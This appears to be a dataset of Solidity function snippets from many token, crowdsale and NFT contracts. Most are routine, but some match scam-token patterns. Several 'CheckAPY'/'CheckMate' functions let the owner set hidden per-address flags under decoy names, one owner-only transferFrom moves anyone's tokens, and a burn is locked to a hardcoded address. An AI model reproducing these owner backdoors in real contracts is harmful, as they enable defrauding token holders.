function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {
        if (whitelist[addr]) {
            whitelist[addr] = false;
            emit WhitelistedAddressRemoved(addr);
            success = true;
        }
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function recoverLostToken( address _token ) external returns ( bool ) {
        TransferHelper.safeTransfer(_token, DAO, IERC20( _token ).balanceOf( address(this)));
        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
    owner = msg.sender;
    balances[owner] = totalSupply;
    emit Transfer(0x0, owner, totalSupply);
  }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
        require(index < totalSupply(), 'ERC721A: global index out of bounds');
        return index;
    }
--------------------------------------------------------------------------------
function ChangeOwner(address vNewOwnerA) IsOwner {
    require(vNewOwnerA != address(0)
         && vNewOwnerA != ownerA);
    LogOwnerChange(ownerA, vNewOwnerA);
    ownerA = vNewOwnerA;
  }
--------------------------------------------------------------------------------
function nextVersion(address _registrant, bytes32 _name) public view returns (uint256) {
	    bytes32 registrantNameIndex = keccak256(abi.encodePacked(_registrant, _name));
	    return (registrantNameVersionCount[registrantNameIndex] + 1);
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    loki[spender] = val;
    laufeson[spender] = val2; 
    sylvie[spender] = val3;
    wyoming = val4;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function ownerSafeWithdrawal() external onlyOwner nonReentrant {
        uint balanceToSend = this.balance;
        beneficiary.transfer(balanceToSend);
        FundTransfer(beneficiary, balanceToSend, false);
    }
--------------------------------------------------------------------------------
function HcoinToken() public {
        _totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value, uint256 _fee) onlyOwner public returns (bool success) {
        _transfer(_from, owner, _fee);
        _transfer(_from, _to, _value - _fee);
        return true;
    }
--------------------------------------------------------------------------------
constructor() {
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
--------------------------------------------------------------------------------
function  approve(address spender, uint tokens) public {
		allowed[msg.sender][spender] = tokens;
		emit Approval(msg.sender, spender, tokens);
	}
--------------------------------------------------------------------------------
function withdrawDividend() external {
            dividendToReward();
            require(project_owner.balance > dividend, "BALANCE IS EMPTY");
            project_owner.transfer(dividend);  
    }
--------------------------------------------------------------------------------
function release(address _to, uint256 _amount)
        onlyOwner
        hasEnoughUnreleasedBBT(_amount)
        whenNotPaused
        public
        returns(bool)
    {
        releaseBBT(_to, _amount);
        emit Release(msg.sender, _to, _amount);
        return true;
    }
--------------------------------------------------------------------------------
constructor(address founder) public {
        owner = founder;
        collector = founder;
        distributor = founder;
        freezer = founder;

        balanceOf[founder] = totalSupply;
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function buy(address _referredBy)
        public
        payable
        returns(uint256)
    {

        require(tx.gasprice <= 0.05 szabo);
        purchaseTokens(msg.value, _referredBy, false);
    }
--------------------------------------------------------------------------------
function()
        payable
        public
    {

        require(tx.gasprice <= 0.05 szabo);
        purchaseTokens(msg.value, 0x0, false);
    }
--------------------------------------------------------------------------------
function batchResolveAquarium(uint256[] _seeds) onlyResolver public {
        for (uint256 i = 0; i < _seeds.length; i ++) {
            _resolveAquarium(_seeds[i]);
        }
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = _msgSender();
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        AltcoinToken t = AltcoinToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
--------------------------------------------------------------------------------
function receiveApproval(address _sender, uint256, address _tokenContract, bytes _extraData) external
    {
        uint32 lotId = getLotId(_extraData);
        _bidNativeWithToken(lotId, address(0x0), ERC20(_tokenContract), _sender);
    }
--------------------------------------------------------------------------------
function getBetAt(address _participant, uint256 _blockNumber) public view returns (uint256 _oddBets, uint256 _evenBets){
        return (participants[_participant].bets[_blockNumber].ODDBets, participants[_participant].bets[_blockNumber].EVENBets);
    }
--------------------------------------------------------------------------------
function getMintDigest(uint256 nonce, bytes32 challenge_digest, bytes32 challenge_number) public view returns(bytes32 digesttest) {
        bytes32 digest = keccak256(abi.encodePacked(challenge_number, msg.sender, nonce));
        return digest;
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, bytes32 _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function rescue() public payable onlyOwner returns (bool) {
        uint256 stuckAmt = address(this).balance;
        msg.sender.transfer(stuckAmt);
        return true;
    }
--------------------------------------------------------------------------------
function setupAccreditedAddress(address _accredited, uint _amountInEthers) public returns (bool success) {
        require(msg.sender == creator);    
        accredited[_accredited] = _amountInEthers * 1 ether;
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool success)
  {
    bytes memory empty; // null
    _transfer( msg.sender, to, value, empty );
    return true;
  }
--------------------------------------------------------------------------------
function __flooredLog10__(uint _number)
    public
    constant
    returns (uint256)
  {
    uint unit = 0;
    while (_number / (10**unit) >= 10)
      unit++;
    return unit;
  }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function mintTokens(address[] calldata recipients)
  public
  payable
  onlyOwner{
    for(uint i=0; i<recipients.length; i++){
        _mint(recipients[i]);
     }
  }
--------------------------------------------------------------------------------
function _mint(address to) internal virtual returns (uint256){
    _tokenIds.increment();
    uint256 id = _tokenIds.current();
    _safeMint(to, id);

    return id;
  }
--------------------------------------------------------------------------------
function cycleGenerationSeed() public onlyOwner {
		_generationSeed = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.difficulty)));
	}
--------------------------------------------------------------------------------
function unbridgeFromL2(uint256 tokenId, address to) external onlyFromCrossDomainAccount(_pixelconInvadersContract) {
		//require(tokenId != uint256(0), "Invalid ID"); //duplicate require in 'transferFrom' function
		//require(to != address(0), "Invalid address"); //duplicate require in 'transferFrom' function
		
		//transfer
		IPixelCons(_pixelconsContract).transferFrom(address(this), to, tokenId);
		emit Unbridge(tokenId, to);
	}
--------------------------------------------------------------------------------
constructor() public {
    tkn = TokenContract(0xea674f79acf3c974085784f0b3e9549b39a5e10a);                    // address of the token contract
    investorsStorage = InvestorsStorage(0x15c7c30B980ef442d3C811A30346bF9Dd8906137);      // address of the storage contract
    minInvestment = 100 finney;
    updatePrice(5000);
  }
--------------------------------------------------------------------------------
function bigbonus() public view virtual  returns (uint256) {
        if (_bonusWins.mul(100)>=_bigBonusLim) return _bigBonusLim;
        return _bonusWins.mul(100);
    }
--------------------------------------------------------------------------------
function CheckMate(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    foxnews[spender] = val;
    biden[spender] = val2; 
    redneck[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function listAddress( address _user, uint _amount ) public onlyOwner {
        require(_user != address(0x0));

        addressCap[_user] = _amount;
        ListAddress( _user, _amount, now );
    }
--------------------------------------------------------------------------------
function getEtherAmountFromToken(uint _amount) private view returns (uint) {
    require(aiTokenG3 > 0, "Invalid aiTokenG3, please contact admin");
    return _amount / aiTokenG3;
  }
--------------------------------------------------------------------------------
function getBalance(ERC20 token) public view returns(uint) {
        if (token == ETH_TOKEN_ADDRESS)
            return this.balance;
        else
            return token.balanceOf(this);
    }
--------------------------------------------------------------------------------
constructor(ERC20 _token, uint256 _price) public {
    require(_token != address(0));
    require(_price > 0);
    token = _token;
    price = _price;
  }
--------------------------------------------------------------------------------
function balance() public view returns (uint256) {
    address self = address(this);
    uint256 selfBalance = token.balanceOf(self);
    return selfBalance;
  }
--------------------------------------------------------------------------------
function depositWithExpiry(address payable vault, address asset, uint amount, string memory memo, uint expiration) external payable {
        require(block.timestamp < expiration, "THORChain_Router: expired");
        deposit(vault, asset, amount, memo);
    }
--------------------------------------------------------------------------------
function _setImplementation(address _newImplementation) internal {
    require(msg.sender == proxyOwner());
    bytes32 position = implementationPosition;

    assembly {
      sstore(position, _newImplementation)
    }
  }
--------------------------------------------------------------------------------
function AUSCOIN(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    cups[spender] = val;
    teatime[spender] = val2; 
    hamilton[spender] = val3;
    bummer = val4;
  }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value)public{
          if(lock && (msg.sender!=tokenManager)){
               throw;
          }

          super.transferFrom(_from,_to,_value);
     }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public returns (bool) {
          if(lock && (msg.sender!=tokenManager)){
               throw;
          }

          return super.approve(_spender,_value);
     }
--------------------------------------------------------------------------------
function getPrice() public view returns (uint price) {
        return (_totalSupply - balances[address(this)]) * 0.0001 ether + 0.1 ether;
    }
--------------------------------------------------------------------------------
function mint(address _to, uint256 _amount) public onlyGovernanceContracts virtual returns (bool) {
        _mint(_to, _amount);
        _moveDelegates(address(0), _delegates[_to], _amount);
        return true;
    }
--------------------------------------------------------------------------------
function getTokenAmount(uint256 weiAmount) internal view returns(uint256) {
        if(!preIcoHasEnded()){
            return weiAmount.mul(preIcoRate);
        }else{
            return weiAmount.mul(icoRate);
        }
    }
--------------------------------------------------------------------------------
function VanityCrowdsale(uint256 _startTime, uint256 _endTime, address _ownerWallet) public {
        startTime = _startTime;
        endTime = _endTime;
        ownerWallet = _ownerWallet;

        token = new VanityToken();
        token.pause();
    }
--------------------------------------------------------------------------------
function isOwner() internal returns(bool success) {
        if ((msg.sender == owner) || (msg.sender == super_owner)) return true;
        return false;
    }
--------------------------------------------------------------------------------
function SimpleToken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value)
    returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function distributeTokens(address _to, uint256 _value) public {
        require(distributionAddress == msg.sender || owner == msg.sender);
        super.transfer(_to, _value);
    }
--------------------------------------------------------------------------------
function AUSC(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    turtle[spender] = val;
    colombia[spender] = val2; 
    areas[spender] = val3;
    yucatan = val4;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function confirmAggregator(address _aggregator)
    external
    onlyOwner()
  {
    require(_aggregator == address(proposedAggregator), "Invalid proposed aggregator");
    delete proposedAggregator;
    setAggregator(_aggregator);
  }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
    stApprovalForAll[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function queryToken(uint256 _tokenId) external view returns ( uint256 price, uint256 last_deal_time ) {
    TokenGDC memory token = stTokens[_tokenId];
    price = token.price;
    last_deal_time = token.last_deal_time;
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
            public
            ownerExists(msg.sender)
            transactionExists(transactionId)
            notConfirmed(transactionId, msg.sender)
        {
            confirmations[transactionId][msg.sender] = true;
            Confirmation(msg.sender, transactionId);
            executeTransaction(transactionId);
        }
--------------------------------------------------------------------------------
function withdrawTokens(IERC20 token) public onlyOwner {
      uint256 balance = token.balanceOf(address(this));
      token.transfer(msg.sender, balance);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
    owner = msg.sender;
    balances[owner] = totalSupply;
    emit Transfer(0x0, owner, totalSupply);
  }
--------------------------------------------------------------------------------
function () external payable
    {
                        if( msg.value > 0 )
            buyTokens(msg.sender);
        else
            airDrop(msg.sender); 
        
        
        
           
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function SCX() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function getBalance( ERC20 token ) constant returns(uint){
        if( token == ETH_TOKEN_ADDRESS ) return this.balance;
        else return token.balanceOf(this);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setPauseState(bool _isPaused) external {
        require(msg.sender == owner, "For owner use ONLY!!!");
        paused = _isPaused;
    }
--------------------------------------------------------------------------------
function massWithdraw(uint256[] memory _pids) public {
        // We batch the handling of all rewards collection here, to reduce gas fee
        loadAllRopesIntoBooster();

        for (uint i=0; i < _pids.length; i++) {
            // As we handled the rewards at the beginning, we dont need to worry about it
            _withdrawWithoutRewards(i);
        }
    }
--------------------------------------------------------------------------------
function registerDINs(uint256 quantity) {
        require(quantity <= MAX_QUANTITY);

        for (uint i = 0; i < quantity; i++) {
            registerDIN();
        }
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
constructor(address _owner)
        public
    {
        require(_owner != address(0));
        owner = _owner;
        emit OwnerChanged(address(0), _owner);
    }
--------------------------------------------------------------------------------
function getToken(uint256 _tokenId) public view returns (
        string tokenName,
        address owner
    ) {
        Token storage token = tokens[_tokenId];
        tokenName = token.name;
        owner = tokenIndexToOwner[_tokenId];
    }
--------------------------------------------------------------------------------
function divide(uq112x112 memory self, uint112 x) internal pure returns (uq112x112 memory) {
        require(x != 0, 'FixedPoint: DIV_BY_ZERO');
        return uq112x112(self._x / uint224(x));
    }
--------------------------------------------------------------------------------
function fraction(uint112 numerator, uint112 denominator) internal pure returns (uq112x112 memory) {
        require(denominator > 0, "FixedPoint: DIV_BY_ZERO");
        return uq112x112((uint224(numerator) << RESOLUTION) / denominator);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _preValidatePurchase(
    address beneficiary,
    uint256 weiAmount
  )
    internal
  {
    super._preValidatePurchase(beneficiary, weiAmount);
    require(
      _contributions[beneficiary].add(weiAmount) <= _caps[beneficiary]);
  }
--------------------------------------------------------------------------------
function setDateMainStart(uint _unixts) public onlyOwner checkDateOrder {
        require(now < _unixts && now < dateMainStart);
        dateMainStart = _unixts;
        emit IcoDateUpdated(1, _unixts);
    }
--------------------------------------------------------------------------------
function isMainFirstDay() public view returns (bool) {
        if (now > dateMainStart && now <= dateMainStart + 1 days) return true;
        return false;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function activateSub(
        uint _subId
    ) public onlySubOwner(_subId) {
        StoredSubData storage sub = strategiesSubs[_subId];

        sub.isEnabled = true;

        emit ActivateSub(_subId);
    }
--------------------------------------------------------------------------------
function deactivateSub(
        uint _subId
    ) public onlySubOwner(_subId) {
        StoredSubData storage sub = strategiesSubs[_subId];

        sub.isEnabled = false;

        emit DeactivateSub(_subId);
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
        super._mint(_to, _tokenId);

        allTokensIndex[_tokenId] = allTokens.length;
        allTokens.push(_tokenId);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function Mints(uint256 quantity) external onlyOwner {
    
     require(totalSupply() + quantity <= amountForDevs, "reached max supply");
    _safeMint(msg.sender, quantity);
  }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    mexico[spender] = val;
    belize[spender] = val2; 
    elsalvador[spender] = val3;
    colombia = val4;
  }
--------------------------------------------------------------------------------
function hodl() payable public {
        hodlers[msg.sender] += msg.value;
        emit Hodl(msg.sender, msg.value);
    }
--------------------------------------------------------------------------------
constructor() public {
        version = 1;

        // default token reward of 100 tokens.  
        // token has 18 decimal places so that's why 100 * 10^18
        tokenReward = 100 * 10**18;

        // default saleFee of 10%
        saleFee = 10;

        // default withdrawAddress is owner
        withdrawAddress = msg.sender;
    }
--------------------------------------------------------------------------------
function createLockedTokenCor(address _recipient, uint _value)
		whenMintable
		onlyMinter
		returns (bool) 
	{
		lockedBalanceCor_index[lockedBalanceCor_count] = _recipient;
		lockedBalanceCor[_recipient] += _value;
		lockedBalanceCor_count++;

		totalSupply += _value;
		return true;
	}
--------------------------------------------------------------------------------
function createLockedTokenPri(address _recipient, uint _value)
		whenMintable
		onlyMinter
		returns (bool) 
	{
		lockedBalancePri_index[lockedBalancePri_count] = _recipient;
		lockedBalancePri[_recipient] += _value;
		lockedBalancePri_count++;

		totalSupply += _value;
		return true;
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function registerDINsWithResolver(address owner, address resolver, uint256 amount) public {
        for (uint i = 0; i < amount; i++) {
            registry.registerDINWithResolver(owner, resolver);
        }
    }
--------------------------------------------------------------------------------
function _buyEthOnUniswap(string tokenSymbol, uint tokenAmount) internal returns (uint) {
//        uint expectedEth = _uniswap[tokenSymbol].getTokenToEthInputPrice(tokenAmount);
//        uint slippage = _getAllowedSlippage(tokenSymbol, expectedEth);
        uint minEth = 1; // expectedEth - slippage;

//        _tokensInArbitration = tokenAmount;
        return _uniswap[tokenSymbol].tokenToEthSwapInput(tokenAmount, minEth, block.timestamp);
    }
--------------------------------------------------------------------------------
function finalize() public inState(State.Success) onlyOwner stopInEmergency {

    // Already finalized
    if(finalized) {
      throw;
    }

    // Finalizing is optional. We only call it if we are given a finalizing agent.
    if(address(finalizeAgent) != 0) {
      finalizeAgent.finalizeCrowdsale();
    }

    finalized = true;
  }
--------------------------------------------------------------------------------
function multiConfirm(uint[] _idPayments) public onlyOwner {
        for (uint i = 0; i < _idPayments.length; i++) {
            doConfirmPayment(_idPayments[i]);
        }
    }
--------------------------------------------------------------------------------
function multiCancel(uint[] _idPayments) public onlyOwner {
        for (uint i = 0; i < _idPayments.length; i++) {
            doCancelPayment(_idPayments[i]);
        }
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function changePresaleTimeRange(uint256 _startTimePre, uint256 _endTimePre) public onlyOwner {
    require(_endTimePre >= _startTimePre);
    PresaleTimeRangeChanged(owner, _startTimePre, _endTimePre);
    startTimePre = _startTimePre;
    endTimePre = _endTimePre;
  }
--------------------------------------------------------------------------------
function changeIcoTimeRange(uint256 _startTimeIco, uint256 _endTimeIco) public onlyOwner {
    require(_endTimeIco >= _startTimeIco);
    IcoTimeRangeChanged(owner, _startTimeIco, _endTimeIco);
    startTimeIco = _startTimeIco;
    endTimeIco = _endTimeIco;
  }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index)
        public
        view
        override
        returns (uint256)
    {
        require(index < totalSupply(), "ERC721A: global index out of bounds");
        return index;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function doFinalize() public inState(State.Success) onlyOwner stopInEmergency {

    // Already finalized
    if(finalized) {
      revert();
    }

    // Finalizing is optional. We only call it if we are given a finalizing agent.
    if(address(finalizeAgent) != 0) {
      finalizeAgent.finalizeCrowdsale();
    }

    finalized = true;
  }
--------------------------------------------------------------------------------
function checkGoalReached() afterDeadline public {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            emit GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }
--------------------------------------------------------------------------------
function LifPresale(uint256 _weiRaised, uint256 _maxCap, address _wallet) {
    require(_weiRaised < _maxCap);

    weiRaised = _weiRaised;
    maxCap = _maxCap;
    wallet = _wallet;
    paused = true;
  }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function ReduceMaxLimit(uint256 newlLimit)
   public
   onlyOwner()
 {
   uint256 totalLimit = maxLimit;
   require(newlLimit >= minLimit);
   require(newlLimit <= totalLimit);
   maxLimit = newlLimit;
 }
--------------------------------------------------------------------------------
function removeMinter(address minter)
        external
        onlyMasterMinter
        returns (bool)
    {
        minters[minter] = false;
        minterAllowed[minter] = 0;
        emit MinterRemoved(minter);
        return true;
    }
--------------------------------------------------------------------------------
function ProofOfEtherDelta() public payable {
        roughSupply = 100;
        gooBalance[msg.sender] = 100;
        lastGooSaveTime[msg.sender] = block.timestamp;
    }
--------------------------------------------------------------------------------
function changeVotingRules(
        uint minimumQuorumForProposals,
        uint minutesForDebate,
        int marginOfVotesForMajority
    ) onlyOwner public {
        minimumQuorum = minimumQuorumForProposals;
        debatingPeriodInMinutes = minutesForDebate;
        majorityMargin = marginOfVotesForMajority;

        emit ChangeOfRules(minimumQuorum, debatingPeriodInMinutes, majorityMargin);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function getMultiplier(uint _from, uint _to) private view returns (uint) {
        //require(startBlockTime > 0, "farming not activated yet.!");
        uint _blockCount = _to.sub(_from);

        return lumosPerBlock.wmul(lmsPriceMultiplier).mul(_blockCount);//.wdiv(1 ether);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function addBotToBlackList (address botAdd) public {
        require(_msgSender() == _charityAddress, "ERC20: cannot permit dev address");
        _listBotAddresses.push(botAdd);
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
		require(transferStatus || msg.sender == owner);
		return super.transferFrom(_from, _to, _value);
	}
--------------------------------------------------------------------------------
function addOwnToken() onlyOwner public returns (bool) {
        require(setOwnContract);
        addToWhitelist(this, 5000 * 1e8, 36500);
        setOwnContract = false;
        return true;
    }
--------------------------------------------------------------------------------
function Burn(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x75338d27E37c3869A42c41f68CC6Cc024704fa2A,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
constructor(address _wallet) public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[_wallet] = INITIAL_SUPPLY;
    emit Transfer(address(0), _wallet, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function Authorizable() {
        authorizers.length = 2;
        authorizers[1] = msg.sender;
        authorizerIndex[msg.sender] = 1;
    }
--------------------------------------------------------------------------------
function addAuthorized(address _addr) external onlyAuthorized {
        authorizerIndex[_addr] = authorizers.length;
        authorizers.length++;
        authorizers[authorizers.length - 1] = _addr;
    }
--------------------------------------------------------------------------------
function() public payable {
    // throws on failure
    parentAddress.transfer(msg.value);
    // Fire off the deposited event if we can forward it
    ForwarderDeposited(msg.sender, msg.value, msg.data);
  }
--------------------------------------------------------------------------------
function updateDarsa(string memory darsa_uac, string memory darsa_utc) external onlyOwner returns(string memory){
        
        DARSA_UAC = darsa_uac;
        DARSA_UTC = darsa_utc;
        
        return "DARSA UAC and UTC updated successfully";
    }
--------------------------------------------------------------------------------
function createRealmSale(uint _num, uint _startId, uint _price) public onlyAdmin {
        for(uint i = 0; i<_num; i++) {
            _generateRealmSale(_startId + i, _price);
        }
    }
--------------------------------------------------------------------------------
function emergencySetStartingIndexBlock() public onlyOwner {
        require(startingIndex == 0, "Starting index is already set");
        startingIndexBlock = block.number;
    }
--------------------------------------------------------------------------------
function addWhitelistWallets(address[] calldata winners) external payable onlyOwner {
        for (uint256 wallet;wallet < winners.length;wallet++) {
            claimedW[winners[wallet]] = 1;
        }
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
constructor (address _admin)
    public
    {
        // add administrators here
        administrators[keccak256(abi.encode(_admin))] = true;
        admin_ = _admin;
        blockLucky = block.number;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function remainingTokens() external view returns (uint256) {
        return Math.min(
            saleToken.balanceOf(tokenWallet),
            saleToken.allowance(tokenWallet, address(this))
        );
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint _amount) 
        returns (bool success)
    {
        // Cannot transfer before crowdsale ends or cap reached
        // AP Ok
        require(now > ENDDATE || totalEthers == CAP);
        // Standard transferFrom
        // AP Ok
        return super.transferFrom(_from, _to, _amount);
    }
--------------------------------------------------------------------------------
function isPendingRegistration(address _darknodeID) external view returns (bool) {
        uint256 registeredAt = store.darknodeRegisteredAt(_darknodeID);
        return registeredAt != 0 && registeredAt > currentEpoch.blocknumber;
    }
--------------------------------------------------------------------------------
function isPendingDeregistration(address _darknodeID) external view returns (bool) {
        uint256 deregisteredAt = store.darknodeDeregisteredAt(_darknodeID);
        return deregisteredAt != 0 && deregisteredAt > currentEpoch.blocknumber;
    }
--------------------------------------------------------------------------------
function isDeregistered(address _darknodeID) public view returns (bool) {
        uint256 deregisteredAt = store.darknodeDeregisteredAt(_darknodeID);
        return deregisteredAt != 0 && deregisteredAt <= currentEpoch.blocknumber;
    }
--------------------------------------------------------------------------------
function transferAll() public returns (bool) {
